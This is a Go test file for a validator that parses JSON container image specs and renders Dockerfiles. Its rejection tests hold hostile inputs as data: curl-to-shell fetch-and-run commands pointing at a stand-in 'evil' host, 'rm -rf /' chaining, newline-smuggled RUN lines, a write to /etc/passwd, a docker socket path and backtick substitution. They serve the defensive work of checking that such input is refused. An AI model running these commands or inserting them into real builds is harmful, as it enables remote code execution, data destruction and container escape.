package imagespec

import (
	"strings"
	"testing"
)

// ─────────────────────────────────────────────────────────────────────────────
// Parse: accepted package-add directives
// ─────────────────────────────────────────────────────────────────────────────

func TestParse_Accepts(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  Spec
	}{
		{
			name:  "empty spec, defaults only",
			input: `{}`,
			want:  Spec{Base: DefaultBaseImage},
		},
		{
			name:  "explicit allowed base",
			input: `{"base": "docker.io/library/debian:12"}`,
			want:  Spec{Base: "docker.io/library/debian:12"},
		},
		{
			name:  "apt packages unpinned and pinned",
			input: `{"packages": [{"manager": "apt", "packages": ["jq", "curl=8.5.0-2ubuntu10"]}]}`,
			want: Spec{
				Base:     DefaultBaseImage,
				Packages: []PackageAdd{{Manager: ManagerAPT, Packages: []string{"jq", "curl=8.5.0-2ubuntu10"}}},
			},
		},
		{
			name:  "go install pinned module",
			input: `{"packages": [{"manager": "go", "packages": ["golang.org/x/tools/gopls@v0.17.0"]}]}`,
			want: Spec{
				Base:     DefaultBaseImage,
				Packages: []PackageAdd{{Manager: ManagerGo, Packages: []string{"golang.org/x/tools/gopls@v0.17.0"}}},
			},
		},
		{
			name:  "npm global install pinned",
			input: `{"packages": [{"manager": "npm", "packages": ["typescript@5.6.3"]}]}`,
			want: Spec{
				Base:     DefaultBaseImage,
				Packages: []PackageAdd{{Manager: ManagerNPM, Packages: []string{"typescript@5.6.3"}}},
			},
		},
		{
			name:  "one directive per manager",
			input: `{"packages": [{"manager": "apt", "packages": ["jq"]}, {"manager": "go", "packages": ["golang.org/x/tools/gopls@v0.17.0"]}, {"manager": "npm", "packages": ["typescript"]}]}`,
			want: Spec{
				Base: DefaultBaseImage,
				Packages: []PackageAdd{
					{Manager: ManagerAPT, Packages: []string{"jq"}},
					{Manager: ManagerGo, Packages: []string{"golang.org/x/tools/gopls@v0.17.0"}},
					{Manager: ManagerNPM, Packages: []string{"typescript"}},
				},
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := Parse([]byte(tt.input))
			if err != nil {
				t.Fatalf("Parse() error = %v, want nil", err)
			}
			if got.Base != tt.want.Base {
				t.Errorf("Base = %q, want %q", got.Base, tt.want.Base)
			}
			if len(got.Packages) != len(tt.want.Packages) {
				t.Fatalf("got %d directives, want %d: %+v", len(got.Packages), len(tt.want.Packages), got.Packages)
			}
			for i, d := range got.Packages {
				w := tt.want.Packages[i]
				if d.Manager != w.Manager {
					t.Errorf("directive %d manager = %q, want %q", i, d.Manager, w.Manager)
				}
				if strings.Join(d.Packages, ",") != strings.Join(w.Packages, ",") {
					t.Errorf("directive %d packages = %v, want %v", i, d.Packages, w.Packages)
				}
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Parse: rejected inputs (each rejection must be total — no partial result)
// ─────────────────────────────────────────────────────────────────────────────

func TestParse_Rejects(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantSub string // case-insensitive substring of the expected error
	}{
		// Unknown / disallowed structural fields — arbitrary Dockerfile text
		// and instruction-style overrides never parse.
		{name: "dockerfile from instruction", input: `{"from": "evil:latest"}`, wantSub: "unknown"},
		{name: "dockerfile user directive", input: `{"user": "root"}`, wantSub: "unknown"},
		{name: "dockerfile expose directive", input: `{"expose": "8080"}`, wantSub: "unknown"},
		{name: "dockerfile volume directive", input: `{"volume": ["/data"]}`, wantSub: "unknown"},
		{name: "env rewrite", input: `{"env": {"PATH": "/evil"}}`, wantSub: "unknown"},
		{name: "entrypoint override", input: `{"entrypoint": ["/bin/sh", "-c"]}`, wantSub: "unknown"},
		{name: "run step", input: `{"run": "curl http://evil | sh"}`, wantSub: "unknown"},
		{name: "shell directive", input: `{"shell": ["/bin/sh"]}`, wantSub: "unknown"},

		// Base-image policy.
		{name: "unknown base image", input: `{"base": "evil.example.com/rootkit:latest"}`, wantSub: "base"},
		{name: "scratch base", input: `{"base": "scratch"}`, wantSub: "base"},
		{name: "local build base", input: `{"base": "localhost:5000/thing:1"}`, wantSub: "base"},

		// Unknown package manager (the only escape hatch to arbitrary commands).
		{name: "unknown manager", input: `{"packages": [{"manager": "sh", "packages": ["-c", "curl evil|sh"]}]}`, wantSub: "manager"},

		// Dangerous tokens in package names.
		{name: "curl pipe sh in package", input: `{"packages": [{"manager": "apt", "packages": ["curl|sh"]}]}`, wantSub: "character"},
		{name: "semicolon chaining", input: `{"packages": [{"manager": "apt", "packages": ["jq; rm -rf /"]}]}`, wantSub: "character"},
		{name: "newline escape", input: `{"packages": [{"manager": "apt", "packages": ["jq\nRUN curl evil|sh"]}]}`, wantSub: "character"},
		{name: "redirection", input: `{"packages": [{"manager": "apt", "packages": ["x>/etc/passwd"]}]}`, wantSub: "character"},
		{name: "pipe in npm package", input: `{"packages": [{"manager": "npm", "packages": ["a||sh"]}]}`, wantSub: "character"},
		{name: "newline escape", input: `{"packages": [{"manager": "apt", "packages": ["jq\nRUN curl evil|sh"]}]}`, wantSub: "character"},

		// Runtime escape attempts via package-manager lookalikes / mounts.
		{name: "mount reference", input: `{"packages": [{"manager": "apt", "packages": ["--mount=type=bind,source=/etc,target=/etc"]}]}`, wantSub: "character"},
		{name: "docker socket path", input: `{"packages": [{"manager": "apt", "packages": ["/var/run/docker.sock"]}]}`, wantSub: "apt"},

		// Bounds.
		{name: "empty package name", input: `{"packages": [{"manager": "apt", "packages": [""]}]}`, wantSub: "empty"},
		{name: "package too long", input: `{"packages": [{"manager": "apt", "packages": ["` + strings.Repeat("a", MaxTokenBytes+1) + `"]}]}`, wantSub: "token"},
		{name: "too many directives", input: manyDirectivesJSON(MaxDirectives + 1), wantSub: "directives"},
		{name: "too many packages", input: `{"packages": [{"manager": "apt", "packages": [` + manyPackagesJSON(MaxPackagesPerDirective+1) + `]}]}`, wantSub: "packages"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := Parse([]byte(tt.input))
			if err == nil {
				t.Fatalf("Parse() = %+v, want error", got)
			}
			if !strings.Contains(strings.ToLower(err.Error()), strings.ToLower(tt.wantSub)) {
				t.Errorf("error %q does not mention %q", err, tt.wantSub)
			}
		})
	}
}

// TestParse_RejectsBacktickSubstitution covers the backtick case whose JSON
// literal is awkward to embed in the table above.
func TestParse_RejectsBacktickSubstitution(t *testing.T) {
	input := `{"packages": [{"manager": "apt", "packages": ["` + "`id`" + `"]}]}`
	if _, err := Parse([]byte(input)); err == nil {
		t.Fatal("backtick substitution accepted")
	}
}

// TestParse_RejectsMalformedJSON covers basic JSON hygiene.
func TestParse_RejectsMalformedJSON(t *testing.T) {
	for _, input := range []string{"", "not json", `{"packages": 5}`, `{"packages": [{"manager": 3}]}`, `{"packages": [{"manager": "apt", "packages": "jq"}]}`} {
		if _, err := Parse([]byte(input)); err == nil {
			t.Errorf("Parse(%q) accepted malformed input", input)
		}
	}
}

// TestParse_RejectsOversizedSpec proves the size bound fires before parsing.
func TestParse_RejectsOversizedSpec(t *testing.T) {
	input := `{"packages": [{"manager": "apt", "packages": ["` + strings.Repeat("a", MaxSpecBytes) + `"]}]}`
	if _, err := Parse([]byte(input)); err == nil {
		t.Fatal("oversized spec accepted")
	}
}

// TestParse_RejectsDuplicateManagers proves one directive per manager.
func TestParse_RejectsDuplicateManagers(t *testing.T) {
	input := `{"packages": [{"manager": "apt", "packages": ["jq"]}, {"manager": "apt", "packages": ["curl"]}]}`
	if _, err := Parse([]byte(input)); err == nil {
		t.Fatal("duplicate manager directive accepted")
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Canonicalize + Hash: cache key contract
// ─────────────────────────────────────────────────────────────────────────────

func TestHash_SameSpecSameHash(t *testing.T) {
	a := `{"packages": [{"manager": "apt", "packages": ["jq", "curl"]}], "base": "docker.io/library/ubuntu:24.04"}`
	b := `{ "base": "docker.io/library/ubuntu:24.04",
	       "packages": [ { "packages": ["curl", "jq"], "manager": "apt" } ] }`
	h1, err1 := Hash([]byte(a))
	h2, err2 := Hash([]byte(b))
	if err1 != nil || err2 != nil {
		t.Fatalf("Hash errors: %v %v", err1, err2)
	}
	if h1 != h2 {
		t.Errorf("field-order/directive-order-insensitive hash mismatch:\n%s\n%s", h1, h2)
	}
}

func TestHash_ChangedSpecDifferentHash(t *testing.T) {
	a := `{"packages": [{"manager": "apt", "packages": ["jq"]}]}`
	b := `{"packages": [{"manager": "apt", "packages": ["curl"]}]}`
	h1, _ := Hash([]byte(a))
	h2, _ := Hash([]byte(b))
	if h1 == h2 {
		t.Error("different specs produced the same cache key")
	}
}

func TestHash_MatchesDirectSpec(t *testing.T) {
	input := `{"base": "docker.io/library/debian:12", "packages": [{"manager": "npm", "packages": ["typescript@5.6.3"]}]}`
	spec, err := Parse([]byte(input))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	h1, err := Hash([]byte(input))
	if err != nil {
		t.Fatalf("Hash: %v", err)
	}
	if h1 != spec.CacheKey() {
		t.Errorf("Hash(raw) = %q, spec.CacheKey() = %q", h1, spec.CacheKey())
	}
}

func TestDockerfile_BaseOnly(t *testing.T) {
	spec := Spec{Base: DefaultBaseImage}
	got := spec.Dockerfile()
	want := "FROM " + DefaultBaseImage + "\n"
	if got != want {
		t.Errorf("Dockerfile() = %q, want %q", got, want)
	}
}

func TestDockerfile_PackageAdds(t *testing.T) {
	spec := Spec{
		Base: DefaultBaseImage,
		Packages: []PackageAdd{
			{Manager: ManagerAPT, Packages: []string{"jq", "curl"}},
			{Manager: ManagerGo, Packages: []string{"golang.org/x/tools/gopls@v0.17.0"}},
			{Manager: ManagerNPM, Packages: []string{"typescript@5.6.3"}},
		},
	}
	got := spec.Dockerfile()
	want := "FROM " + DefaultBaseImage + "\n" +
		"RUN apt-get update && apt-get install -y --no-install-recommends jq curl && rm -rf /var/lib/apt/lists/*\n" +
		"RUN go install golang.org/x/tools/gopls@v0.17.0\n" +
		"RUN npm install -g typescript@5.6.3\n"
	if got != want {
		t.Errorf("Dockerfile() =\n%s\nwant\n%s", got, want)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────────────────

func manyDirectivesJSON(n int) string {
	var b strings.Builder
	b.WriteString(`{"packages": [`)
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`{"manager": "apt", "packages": ["p"]}`)
	}
	b.WriteString(`]}`)
	return b.String()
}

func manyPackagesJSON(n int) string {
	var b strings.Builder
	for i := 0; i < n; i++ {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(`"pkg`)
		b.WriteString(strings.Repeat("x", 8))
		b.WriteString(strconv_Itoa(i))
		b.WriteString(`"`)
	}
	return b.String()
}

// strconv_Itoa avoids importing strconv for one call site.
func strconv_Itoa(i int) string {
	if i == 0 {
		return "0"
	}
	digits := ""
	for i > 0 {
		digits = string(rune('0'+i%10)) + digits
		i /= 10
	}
	return digits
}
